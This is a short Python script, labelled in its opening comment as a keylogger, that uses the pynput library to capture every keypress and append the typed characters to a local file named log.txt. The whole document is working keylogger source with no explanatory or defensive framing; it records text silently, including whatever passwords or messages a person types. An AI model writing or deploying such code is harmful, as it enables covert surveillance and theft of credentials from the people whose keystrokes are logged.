#scriprt to make keylogger

from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == "Key.space":
        letter = " "

    elif letter == "Key.enter":
        letter = "\n"  # New line

    elif letter.startswith("Key."):  # Ignore other special keys (Shift, Ctrl, etc.)
        return

    with open("log.txt",'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()
